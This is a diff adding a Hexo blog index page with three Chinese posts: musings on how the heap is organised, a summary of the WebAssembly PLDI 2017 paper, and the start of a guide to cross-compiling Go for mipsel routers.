@@ -1,0 +1,1415 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2018/05/22/2018/Heap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2018/05/22/2018/Heap/" class="post-title-link" itemprop="url">对堆的认识</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-05-22 23:40:20" itemprop="dateCreated datePublished" datetime="2018-05-22T23:40:20+08:00">2018-05-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2018-05-23 00:09:06" itemprop="dateModified" datetime="2018-05-23T00:09:06+08:00">2018-05-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%BE%AE%E5%9E%8Bblog/" itemprop="url" rel="index"><span itemprop="name">微型blog</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="0x00-缘起"><a href="#0x00-缘起" class="headerlink" title="0x00 缘起"></a>0x00 缘起</h1><p>刚学二进制的时候，对堆没什么概念，就知道是内存，什么都不懂的时候倒没有什么。好好学了Linux操作系统之后，知道了物理内存，虚拟内存，内存分页，操作系统对内存的分配等等。此时突然想到了当时没看懂的堆溢出攻击，今天也看了一些书，都说是由操作系统进行管理的，还以为堆对物理内存中的东西。</p>
+<p>然而看了看堆溢出攻击的原理，可以构造一个数据结构，让操作系统认为这个是堆块，也可以覆盖堆块。重要的是在线性内存（虚拟地址）中，可以看到堆的数据结构。</p>
+<h1 id="0x01-思考"><a href="#0x01-思考" class="headerlink" title="0x01 思考"></a>0x01 思考</h1><p>虽然堆的分配，合并等过程，完全是由操作系统完成的，但是每个进程的堆的的确确是用线性地址进行组织的。所以可以从调试器中看到堆块，块链表等数据结构。</p>
+<p>那为什么Linux Windows都有堆这种数据结构呢？虽然一时解释不出来，但是我觉得按块分配内存，对于高级编程来说应该是很重要的。</p>
+<h1 id="0x02-类比"><a href="#0x02-类比" class="headerlink" title="0x02 类比"></a>0x02 类比</h1><p>堆的双向链表很容易让人联想到的数据结构是操作系统内核的缓冲区。想来堆和缓冲区的思路有一部分是重合的，缓冲区是在实实在在的物理内存中，或者说是内核的地址空间，而堆是在进程的线性地址空间，层次不同。另外缓冲区是要尽量多地占用（尽可能驻留内存），像Mac OS的方式就是将几乎所有空闲物理内存作为缓冲区，以增强性能（文件、软件打开速度）；而堆块不用了要赶紧free掉（否则内存泄漏），理念也不同。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2018/05/17/2018/WebAssembly/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2018/05/17/2018/WebAssembly/" class="post-title-link" itemprop="url">使用WebAssembly来加速Web</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2018-05-17 15:14:11 / Modified: 16:04:08" itemprop="dateCreated datePublished" datetime="2018-05-17T15:14:11+08:00">2018-05-17</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Research-Note/" itemprop="url" rel="index"><span itemprop="name">Research Note</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><h4 id="原文作者：Andreas-Haas等-Google-Dan-Gohman等-Mozilla-Michael-Holman-Microsoft-JF-Bastien-Apple"><a href="#原文作者：Andreas-Haas等-Google-Dan-Gohman等-Mozilla-Michael-Holman-Microsoft-JF-Bastien-Apple" class="headerlink" title="原文作者：Andreas Haas等 (Google), Dan Gohman等(Mozilla), Michael Holman(Microsoft),JF Bastien(Apple)"></a>原文作者：Andreas Haas等 (Google), Dan Gohman等(Mozilla), Michael Holman(Microsoft),JF Bastien(Apple)</h4><h4 id="原文标题：Bringing-the-Web-up-to-Speedwith-WebAssembly"><a href="#原文标题：Bringing-the-Web-up-to-Speedwith-WebAssembly" class="headerlink" title="原文标题：Bringing the Web up to Speedwith WebAssembly"></a>原文标题：Bringing the Web up to Speedwith WebAssembly</h4><h4 id="原文会议：PLDI-2017"><a href="#原文会议：PLDI-2017" class="headerlink" title="原文会议：PLDI 2017"></a>原文会议：PLDI 2017</h4><h4 id="原文链接：https-pldi17-sigplan-org-event-pldi-2017-papers-bringing-the-web-up-to-speed-with-webassembly"><a href="#原文链接：https-pldi17-sigplan-org-event-pldi-2017-papers-bringing-the-web-up-to-speed-with-webassembly" class="headerlink" title="原文链接：https://pldi17.sigplan.org/event/pldi-2017-papers-bringing-the-web-up-to-speed-with-webassembly"></a>原文链接：<a target="_blank" rel="noopener" href="https://pldi17.sigplan.org/event/pldi-2017-papers-bringing-the-web-up-to-speed-with-webassembly">https://pldi17.sigplan.org/event/pldi-2017-papers-bringing-the-web-up-to-speed-with-webassembly</a></h4><h4 id="可下载链接：https-dl-acm-org-citation-cfm-id-3062363"><a href="#可下载链接：https-dl-acm-org-citation-cfm-id-3062363" class="headerlink" title="可下载链接：https://dl.acm.org/citation.cfm?id=3062363"></a>可下载链接：<a target="_blank" rel="noopener" href="https://dl.acm.org/citation.cfm?id=3062363">https://dl.acm.org/citation.cfm?id=3062363</a></h4><p>Web平台的成熟引发了复杂和性能要求苛刻的Web应用程序，如交互式3D可视化，音频和视频软件以及游戏。因此，Web平台上代码的高效性和安全性变得越来越重要。然而，JavaScript作为Web平台（浏览器）唯一内置的语言，并不能很好地满足上述需求。</p>
+<p>来自四大浏览器供应商（Google, Mozilla, Microsoft, Apple）的工程师已经面对这一挑战，合作设计了一个名为WebAssembly的可移植的底层字节码。它提供严谨的格式、有效的验证和编译、低或无开销安全执行。WebAssembly不针对特定的编程模型，而是对现代硬件的一层抽象，这使得WebAssembly和语言、硬件、平台无关，其平台也不仅仅局限于Web。WebAssembly从一开始就被设计为具有正式的语义。论文描述WebAssembly的动机，设计和形式语义，并提供一些实现的初步经验。论文的信息量很大，为了避免篇幅过长，本文只针对论文中提到的及基本思路以及效果进行着重介绍。</p>
+<h1 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h1><p>文章在第一章首先介绍了WebAssembly的一些特性，即安全性、运行速度、可移植性，压缩性（WebAssembly二进制格式非常紧凑，对于通过网络传输的代码来说能够占用较小带宽，提升加载速度）。同时，文章也回顾了在浏览器中运行底层代码在过去的解决之道。例如Microsoft’s ActiveX，Native Client、Emscripten等等。接下来，作者介绍了WebAssembly的抽象语法，如图1所示。</p>
+<p><img src="/img/2018/05/abs.png" alt="图1 WebAssembly抽象语法" title="图1 WebAssembly抽象语法"></p>
+<center>图1 WebAssembly抽象语法</center>
+
+<p>对应图1对抽象语法的表示，论文稍微详细介绍了其中的一部分。</p>
+<h3 id="1-模块（Modules）"><a href="#1-模块（Modules）" class="headerlink" title="1. 模块（Modules）"></a>1. 模块（Modules）</h3><p>Modules定义了函数（functions）、全局变量（globals）、表（tables）、内存（memories）。Modules可以理解为“类”，Modules是静态的，但是模块可以实例化。实例化是由操作系统或JavaScript虚拟机进行的，Modules可以导入也可以导出。</p>
+<h3 id="2-函数（Functions）"><a href="#2-函数（Functions）" class="headerlink" title="2. 函数（Functions）"></a>2. 函数（Functions）</h3><p>除了我们认识的函数之外，论文也解释了WebAssembly函数的一些特性。WebAssembly的函数不是头等函数（first-class function），通俗地讲，函数不能作为其他函数的参数，返回值，赋值给变量等等。但是WebAssembly函数具备嵌套、递归等基本的特性。</p>
+<h3 id="3-指令（Instructions）"><a href="#3-指令（Instructions）" class="headerlink" title="3. 指令（Instructions）"></a>3. 指令（Instructions）</h3><p>WebAssembly基于堆栈的虚拟机（另外一种流行的方法是基于寄存器的虚拟机），采用这种模式构造虚拟机是因为堆栈式虚拟机的二进制程序比寄存器式更紧凑（已经被证明）。由于类型系统，操作数堆栈布局可以在代码中任意位置静态确定，这对于在指令之间编译数据流非常方便，因为操作数堆栈布局可以在指令之间动态确定。</p>
+<h3 id="4-陷阱（Traps）"><a href="#4-陷阱（Traps）" class="headerlink" title="4.  陷阱（Traps）"></a>4.  陷阱（Traps）</h3><p>有一些指令可能会产生陷阱，但是目前WebAssembly无法处理陷阱。嵌入在JavaScript中的WebAssembly会向JavaScript抛出异常，可以被JavaScript捕获和检查。</p>
+<h3 id="5-机器类型（Machine-Type）"><a href="#5-机器类型（Machine-Type）" class="headerlink" title="5. 机器类型（Machine Type）"></a>5. 机器类型（Machine Type）</h3><p>WebAssembly只有4中基本类型，所有这些都可以被通用硬件支持。包括整数和IEEE 754浮点数，每个数字都是32位或64位宽。</p>
+<h3 id="6-局部变量（Local-Variables）"><a href="#6-局部变量（Local-Variables）" class="headerlink" title="6. 局部变量（Local Variables）"></a>6. 局部变量（Local Variables）</h3><p>局部变量使用0作为初始化，并且分别通过<code>get_local</code>和<code>set_local</code>指令进行读取或写入。<code>tee_local</code>允许写入一个局部变量的同时在栈上留下一个输入值，这在实际代码中很常见。局部变量的索引空间以函数参数开头，这意味着函数参数也是可变的。</p>
+<h3 id="7-全局变量（Global-Variables）"><a href="#7-全局变量（Global-Variables）" class="headerlink" title="7. 全局变量（Global Variables）"></a>7. 全局变量（Global Variables）</h3><p>模块可以声明全局变量，全局变量使用get_local和set_local指令去读写。虽然全局变量使用了变量（Variables）这个词，但是全局变量也可以是不变的（常量）。声明一个常量必须使用常量表达式。</p>
+<h1 id="0x02-线性内存和控制流"><a href="#0x02-线性内存和控制流" class="headerlink" title="0x02 线性内存和控制流"></a>0x02 线性内存和控制流</h1><p>WebAssembly使用线性内存，主存储使用一个大字节数组进行组织。每个模块（Modules）可以定义自己内存，模块的内存可以通过导入导出与其他实例共享。内存使用初始大小创建，但是可以随需要动态增长。大小增长的单位是64KiB，这是现代计算机最小页面大小和最大页面大小的最小公倍数。这个页面允许重复使用，固定的大小也方便进行边界检查。</p>
+<p>线性内存使用<code>load</code>和<code>store</code>指令进行访问，内存的访问是对齐的，这些指令采用静态对齐指数，正向静态偏移量，可选静态宽度以及动态i32地址进行组织，地址无符号整数。另外，WebAssembly的线性内存采用小端序（little-endian）进行组织。</p>
+<p>为了保证安全性，线性内存和代码空间的数据结构不相交，也就是线性内存和代码空间完全在两个地方。编译的程序不能破坏其执行环境、跳到任意位置或其他未定义的行为。另外，快速的进程间隔离是WebAssembly与不可信JavaScript和Web API交互的设计约束，并且WebAssembly还允许在不违反内存安全的情况下将WebAssembly引擎嵌入到任何其他托管语言运行时中，并且允许具有自己内存的具有多个独立实例的程序存在于同一个进程中。</p>
+<p>WebAssembly的结构化控制流突出的一个特性是不允许简单跳转，而只能使用结构化的方法（如<code>break</code>、<code>continue</code>）。</p>
+<p>注：对于函数调用，导入导出表等方法，本文不进行过多叙述。</p>
+<h1 id="0x03-跨平台语义确定性"><a href="#0x03-跨平台语义确定性" class="headerlink" title="0x03 跨平台语义确定性"></a>0x03 跨平台语义确定性</h1><p>WebAssembly的一个目标就是在不牺牲代码性能的情况下，做到可移植，这就需要跨平台的语义确定性。在硬件不同的情况下，WebAssembly以最小的执行开销为所有硬件中的所有硬件提供了确定性语义。但是还是有三种特殊情况需要考虑。</p>
+<h3 id="1-NaN-值"><a href="#1-NaN-值" class="headerlink" title="1. NaN 值"></a>1. NaN 值</h3><p>NaN值在不同平台没有一个确定的标准，如果在每次数值操作后都进行NaN标准化开销又太大。因此WebAssembly使用了NaN-boxing技术来避免这一问题。</p>
+<h3 id="2-资源枯竭"><a href="#2-资源枯竭" class="headerlink" title="2. 资源枯竭"></a>2. 资源枯竭</h3><p>WebAssembly在不同平台运行时，由于平台差异，当试图增长线性内存时，一些平台可能会出现资源枯竭的情况。调用或调用间接指令也可能会遇到堆栈溢出，但这从WebAssembly本身内部不是可以观察到的。</p>
+<h3 id="3-主机函数（Host-Functions）"><a href="#3-主机函数（Host-Functions）" class="headerlink" title="3. 主机函数（Host Functions）"></a>3. 主机函数（Host Functions）</h3><p>Host Functions可以理解为系统函数调用，可能会引起WebAssembly的状态变化，但是这不在WebAssembly语义可控范围之内。</p>
+<h1 id="0x04-执行"><a href="#0x04-执行" class="headerlink" title="0x04 执行"></a>0x04 执行</h1><p>论文在对执行进行解释的时候使用了非常多离散数学表示方法。本文只进行一些粗浅的介绍。</p>
+<p>执行相对于全局存储来进行，存储是已分配的模块实、表和内存的存储记录。列表中的索引可以被认为是地址，函数的运行时采用闭包来表示。模块的实例需要被转化为实体记录，转化方法如图2所示。</p>
+<p><img src="/img/2018/05/runtime.png" alt="图2 运行时对象表示语法"></p>
+<center>图2 运行时对象表示语法</center>
+
+<p>为了得到更紧凑的执行规则，同时避免引入操作数和堆栈的单独概念，采用小步缩减（Small-Step）的方式来缩减规则。缩减方法如图3所示。</p>
+<p><img src="/img/2018/05/small-step.png" alt="图3 小步缩减规则"></p>
+<center>图3 小步缩减规则</center>
+
+<h1 id="0x05-嵌入和互操作性"><a href="#0x05-嵌入和互操作性" class="headerlink" title="0x05 嵌入和互操作性"></a>0x05 嵌入和互操作性</h1><p>WebAssembly类似于虚拟的指令集架构（ISA），它没有定义程序如何加载到执行引擎和I / O操作的方法，这种分离设计（嵌入器不由WebAssembly实现）是为了将WebAssembly顺利嵌入到执行环境当中去。而嵌入器定义了模块如何加载，模块之间的导入和导出如何解析，并提供外部函数来完成I / O操作和计时器，并指定如何处理WebAssembly的陷阱（异常）。论文中的主要用例是浏览器JavaScript的嵌入，这些机制是通过JavaScript和Web API实现的。</p>
+<h3 id="1-JavaScript-API"><a href="#1-JavaScript-API" class="headerlink" title="1.  JavaScript API"></a>1.  JavaScript API</h3><p>通过浏览器中的JavaScript API加载，编译和调用WebAssembly模块。粗略的方法是：</p>
+<p>1）从给定源（如网络或磁盘）获取二进制模块</p>
+<p>2）实例化模块，提供必要的导入</p>
+<p>3）调用所需的导出函数</p>
+<p>由于编译和实例化可能很慢，所以用异步方法进行上述处理，其结果包含在JavaScript Promise中。</p>
+<h3 id="2-链接"><a href="#2-链接" class="headerlink" title="2. 链接"></a>2. 链接</h3><p>链接嵌入程序可以实例化多个模块，并使用导出到另一个模块的导出模块。实例之间可以彼此调用对方的函数，共享内存或共享函数和表。导入的全局变量可以作为链接的配置参数。在浏览器中，JavaScript API还允许在外部创建和初始化内存或表，或访问导出的内存和表。它们被表示为专用JavaScript类的对象，每个内存都由标准的ArrayBuffer支持。</p>
+<h3 id="3-相互操作性"><a href="#3-相互操作性" class="headerlink" title="3. 相互操作性"></a>3. 相互操作性</h3><p>链接不同的人编写出的模块是可能的，但是作为低级语言，WebAssembly不提供任何内置对象模型。开发人员需要将他们的数据类型映射为数（numbers）或内存（memories）。这种设计为开发人员提供了最大的灵活性。另外，尽管WebAssembly具有编程语言形式，但是它是对硬件的抽象，而不是对编程语言的抽象，因此与之前的虚拟机不同，WebAssembly不授予任何编程语言编程和对象模型的特殊待遇或是对某些编程语言进行遏制（也就是说任何编程语言都可以编译为WebAssembly，只要编译器针对WebAssembly抽象硬件进行设计）。</p>
+<p>开发人员还可以在WebAssembly之上定义常见的ABI，以便模块可以在不同种类的应用程序中相互操作。这种分离方式对于使WebAssembly成为通用的代码格式至关重要。</p>
+<h1 id="0x06-实现"><a href="#0x06-实现" class="headerlink" title="0x06 实现"></a>0x06 实现</h1><p>WebAssembly的一个主要设计目标是高性能，又能不牺牲安全性或可移植性。 在整个设计过程中，论文的作者们（四大主流浏览器厂商的工程师们）在所有主流浏览器中开发了WebAssembly的独立实现，以验证和通知设计决策，这一节中主要介绍一些有趣的实现的点。</p>
+<h3 id="1-四大浏览器引擎的实现方案"><a href="#1-四大浏览器引擎的实现方案" class="headerlink" title="1.  四大浏览器引擎的实现方案"></a>1.  四大浏览器引擎的实现方案</h3><p>V8（Google Chrome中的JavaScript引擎），Spider-Monkey（Mozilla Firefox中的JavaScript引擎）和JavaScriptCore（WebKit中的JavaScript引擎）在实例化之前重新使用其优化的JIT编译器来提前编译模块。这实现了可预测的高峰值性能，并且避免了热身时间（也就是热启动时间）的不可预测性，而这对JavaScript来说常常是一个问题。</p>
+<p>而微软的Chakra（查克拉，Microsoft Edge中的JavaScript引擎）在第一次执行时离散地将单个函数翻译为解释后的内部字节码格式，然后JIT编译最热门的函数。 这种方法的优点是更快的启动速度和更低的内存消耗。我们预计更多实现方案会随着时间的推移而发展。</p>
+<h3 id="2-快速验证"><a href="#2-快速验证" class="headerlink" title="2. 快速验证"></a>2. 快速验证</h3><p>本文中没有选取论文中关于验证的部分，有兴趣的朋友可以查看可以去原文第4章Validation中查看WebAssembly快速验证代码方案。</p>
+<p>WebAssembly的关键设计目标是快速验证代码。 在上述四个实现中，使用了抽象控制堆栈，具有类型的抽象操作数堆栈和前向程序计数器的相同基本策略。 验证是通过即时检查传入字节码进行的，没有构建中间表示。我们在现代工作站上的一套代表性基准测试中测量的单线验证速度在75 MiB / s和150MiB / s之间。 这大约能够以1吉比/秒的全网速度下执行验证。</p>
+<h3 id="3-底线JIT编译器（Baseline-JIT-Compiler）"><a href="#3-底线JIT编译器（Baseline-JIT-Compiler）" class="headerlink" title="3. 底线JIT编译器（Baseline JIT Compiler）"></a>3. 底线JIT编译器（Baseline JIT Compiler）</h3><p>Mozilla的SpiderMonkey引擎包含两个WebAssembly编译层。 第一个是WebAssembly特定的快速Baseline JIT，它与验证结合，在一次发送中发出机器代码。 JIT在编译期间不会创建内部中间表示（IR），但会跟踪寄存器状态并尝试在正向通道中执行简单的贪婪寄存器分配。 Baseline JIT仅用于快速启动，而Ion优化JIT则在后台并行编译模块。 Ion JIT也被SpiderMonkey用作JavaScript的顶层。</p>
+<h3 id="4-优化JIT编译器（Optimizing-JIT-Compiler）"><a href="#4-优化JIT编译器（Optimizing-JIT-Compiler）" class="headerlink" title="4. 优化JIT编译器（Optimizing JIT Compiler）"></a>4. 优化JIT编译器（Optimizing JIT Compiler）</h3><p>V8，SpiderMonkey，JavaScript-Core和Chakra都包括优化JIT，以实现WebAssembly的最高峰值性能。 V8和Spider-Monkey顶级JIT都使用基于静态单赋值形式（SSA）的中间表示（IR）。因此，重要的是要验证WebAssembly可以在单一线程中解码为SSA格式，以供给这些JIT。</p>
+<h1 id="0x07-性能测试"><a href="#0x07-性能测试" class="headerlink" title="0x07 性能测试"></a>0x07 性能测试</h1><p>论文首先以本机代码（Native Code，使用Clang生成）的运行时间为基准，使用PolyBenchC对WebAssembly（使用Emscripten生成）进行了性能测试，测试结果如图2所示。在这张图里使用Native Code运行时间做归一化，所以100%的一条横线是Native Code的运行时间，Native Code是用Clang编译的真正的二进制程序，WebAssembly有4中情况运行速度更快，7种情况最多没有超过Native Code 的10%，而大部分情况是没有超过Native Code的200%的，这个性能对于运行在V8和SpiderMonkey浏览器引擎里的代码来说，已经非常快了。</p>
+<p><img src="/img/2018/05/time.png" alt="图4 WebAssembly与Native Code运行时间对比"></p>
+<center>图4 WebAssembly与Native Code运行时间对比</center>
+
+<p>对于WebAssembly和asm.js的速度对比，论文没有进行画图比较，作者提到了WebAssembly相较于asm.js快了33.7%。另外，对于代码的紧凑性，实验也进行了比较。论文比较了WebAssembly和asm.js，以及WebAssembly和x86-64本机代码（Native Code）。结果如图5所示。</p>
+<p><img src="/img/2018/05/size.png" alt="图5 WebAssembly与asm.js和NativeCode二进制大小对比"></p>
+<center>图5 WebAssembly与asm.js和NativeCode二进制大小对比</center>
+
+<p>平均来说，WebAssembly代码是asm.js的大小的62.5％（中位数68.6％），以及本机x86-64代码大小的85.3％（中位数78％）。</p>
+<h1 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h1><p>论文中提出的新技术已经在四大主流浏览器引擎中得到了实现。虽然WebAssembly于2017年11月开始受到四大主流浏览器支持，到现在也仅仅过去半年，还有很多需要完善的地方。但是WebAssembly是Web的一个新趋势，其更加广泛的应用势必会给Web带来新的能力和发展空间，同时可能也会为Web安全带来一个全新的领域。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2018/02/07/2018/Golang_mips32le/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2018/02/07/2018/Golang_mips32le/" class="post-title-link" itemprop="url">Golang mips32le(mipsel/ramips) 交叉编译</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-02-07 15:24:02" itemprop="dateCreated datePublished" datetime="2018-02-07T15:24:02+08:00">2018-02-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2018-02-08 17:09:49" itemprop="dateModified" datetime="2018-02-08T17:09:49+08:00">2018-02-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Programing/" itemprop="url" rel="index"><span itemprop="name">Programing</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="0x01-缘起"><a href="#0x01-缘起" class="headerlink" title="0x01 缘起"></a>0x01 缘起</h1><p>要在斐讯K1/K2上写一些代码操纵流量走向，操作逻辑也比较复杂，为了性能本人一开始是用C的，直接在openwrt官网上就可以下载到全套的SDK，包括GCC，G++等等。然而写了两天，已经泡在bug的海洋里了，还是菜。</p>
+<p>为了赶上deadline，不得不换Golang。然而Golang的官方版本是没有针对mipsel架构的，但是Google一下发现Gitbub上存在一个单独的Go项目可以针对mipsel进行交叉编译。</p>
+<p>tip：据说Golang的速度仅次于C++，本人没有实际测过。</p>
+<h1 id="0x02-环境"><a href="#0x02-环境" class="headerlink" title="0x02 环境"></a>0x02 环境</h1><p>本次配置要感谢Go语言中文网jacle169的<a target="_blank" rel="noopener" href="https://studygolang.com/articles/7326">这篇文章</a></p>
+<p>为了赶deadline，很多坑都没有细看怎么回事，直接跳过了。比如：</p>
+<ol>
+<li><p>需要用Ubuntu，我用的是<code>Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</code>，第一次尝试用Kali Linux，同样的架构，但是出现了编译不通过的问题</p>
+</li>
+<li><p>环境变量的配置也比较恶心，按照上述文章的配置，编译看似通过，但是会有一个隐藏的error输出在一堆正常输出中间，不仔细看就略过了。产生的问题就是编译后的bin目录下只有一个gofmt可执行程序，而没有go程序。因此，环境变量的配置如下：</p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GOOS=linux </span><br><span class="line"><span class="built_in">export</span> GOARCH=mips32le</span><br><span class="line"><span class="built_in">export</span> CGO_ENABLED=0</span><br></pre></td></tr></table></figure>
+
